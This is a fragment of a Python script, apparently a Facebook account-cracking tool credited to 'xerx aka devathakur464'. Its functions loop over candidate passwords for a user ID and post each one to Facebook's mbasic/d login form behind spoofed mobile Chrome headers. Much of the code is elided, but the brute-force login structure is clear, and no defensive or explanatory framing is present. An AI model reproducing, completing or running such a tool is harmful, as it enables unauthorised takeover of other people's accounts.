#created by xerx aka devathakur464
#open source by devathakur464
...
os.system("xdg-open https://github.com/devathakur464")
#app  check 
...
def mbasic(uid,pwx,tl):
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5781.211", "Google Chrome";v="114.0.5781.211"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-T505N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5781.211 Mobile Safari/537.36',
    'viewport-width': '980',}
...
def d(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'d.facebook.com': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.0625',
